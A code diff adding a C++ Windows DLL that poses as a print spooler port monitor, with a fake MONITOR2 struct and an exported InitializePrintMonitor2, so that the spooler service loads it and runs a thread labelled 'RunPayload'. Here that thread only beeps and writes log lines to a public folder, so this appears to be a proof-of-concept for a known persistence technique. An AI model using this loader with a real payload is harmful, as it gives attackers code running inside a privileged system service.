@@ -1,0 +1,63 @@
+//g++ -shared -o servDLL.dll servDLL.cpp -static-libgcc -static-libstdc++ -Wl,--subsystem,windows
+#include <windows.h>
+#include <winsplp.h>
+#include <fstream>
+
+
+void LogStep(const char* msg) {
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+
+    char buffer[512];
+    snprintf(buffer, sizeof(buffer),
+             "[%04d-%02d-%02d %02d:%02d:%02d.%03d] %s",
+             st.wYear, st.wMonth, st.wDay,
+             st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
+             msg);
+    
+    HANDLE hFile = CreateFileA("C:\\Users\\Public\\global_loggin.txt",
+        FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        DWORD written;
+        WriteFile(hFile, buffer, (DWORD)strlen(buffer), &written, NULL);
+        WriteFile(hFile, "\r\n", 2, &written, NULL);
+        CloseHandle(hFile);
+    }
+}
+
+DWORD WINAPI RunPayload(LPVOID) {
+    LogStep("PORT MONITOR | Thread started");
+    Beep(500, 300);
+    LogStep("PORT MONITOR | Beeped");
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    LogStep("PORT MONITOR | DllMain called");
+    if (reason == DLL_PROCESS_ATTACH) {
+        LogStep("PORT MONITOR | PROCESS_ATTACH");
+        DisableThreadLibraryCalls(hModule);
+        QueueUserWorkItem(RunPayload, NULL, WT_EXECUTEDEFAULT);
+
+    }
+    return TRUE;
+}
+
+// // https://doxygen.reactos.org/d9/de3/psdk_2winsplp_8h.html
+MONITOR2 g_fakeMonitor = {
+    sizeof(MONITOR2), // Size
+    NULL, NULL, NULL, NULL, NULL,
+    NULL, NULL, NULL, NULL, NULL,
+    NULL, NULL, NULL, NULL, NULL
+};
+
+// Exported entry point required by spooler
+extern "C" __declspec(dllexport)
+LPMONITOR2 WINAPI InitializePrintMonitor2(PMONITORINIT pMonitorInit, PHANDLE phMonitor) {
+    LogStep("PORT MONITOR | InitializePrintMonitor2 called");
+    if (phMonitor) {
+        *phMonitor = NULL;
+    }
+    return &g_fakeMonitor;
+}
